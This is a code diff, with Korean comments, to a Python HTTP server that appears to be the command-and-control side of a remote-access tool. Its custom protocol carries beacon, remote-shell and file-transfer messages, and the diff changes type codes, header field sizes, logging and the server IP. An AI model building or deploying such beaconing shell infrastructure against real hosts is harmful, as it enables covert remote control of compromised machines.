@@ -12,14 +12,13 @@ import threading
 # 커스텀 프로토콜의 타입을 정의해둔 클래스
 class TypeTable:
     TYPE_LIST = {
-        'ERROR' :  b'\x00',          
-        'BEACON_REQUEST' : b'\x01',     
-        'BEACON_RESPONSE' : b'\x02',    
+        'ACK' : b'\x00',    
+        'ERROR' :  b'\x01',
+        'BEACON_REQUEST' : b'\x02',     
         'SHELL_REQUEST' : b'\x03',     
         'SHELL_RESPONSE' : b'\x04',    
         'FTP_REQUEST' : b'\x05',        
         'FTP_RESPONSE' : b'\x06',
-        'NONE' : b'\x10'
     }
 
 
@@ -33,7 +32,7 @@ class CustomProtocol(TypeTable):
     # 헤더 값 구성
     def __init__(self, type : str, seq : int, data : bytes) -> None:
         self.type = self.TYPE_LIST[type]
-        self.length = len(data).to_bytes(2, byteorder="little")
+        self.length = len(data).to_bytes(4, byteorder="little")
         self.sequence = seq.to_bytes(4, byteorder="little")
         self.data = data
 
@@ -66,9 +65,9 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
         result = {}
         result['header'] = hex(raw_data[0])
         result['type'] = self._get_type(raw_data[1])
-        result['length'] = unpack('<L', raw_data[2:4].ljust(4, b'\x00'))[0]
-        result['sequence'] = unpack('<L', raw_data[4:8])[0]
-        result['data'] = raw_data[8:9+result['length']]
+        result['length'] = unpack('<L', raw_data[2:6])[0]
+        result['sequence'] = unpack('<L', raw_data[6:10])[0]
+        result['data'] = raw_data[10:11+result['length']]
         
         return result
     
@@ -131,7 +130,8 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
     # ack response
     def _becon_ack_response(self):
         self._set_header()
-        protocol_data = bytes(CustomProtocol('NONE', 0, b''))
+        protocol_data = bytes(CustomProtocol('ACK', 0, ''.encode(ENCODING)))
+        print(protocol_data)
         self.wfile.write(protocol_data)
 
     def _ftp_request(self, data):
@@ -255,11 +255,11 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
 
 # True : 로그 출력
 # False : 로그 출력 x
-LOG_PRINT = False
+LOG_PRINT = True
 
 # 서버 주소와 포트
 # 자신의 ip, port로 설정
-SERVER_INFO = ('1.251.227.66', 80)
+SERVER_INFO = ('172.17.246.74', 80)
 
 # encoding
 ENCODING = 'cp949'
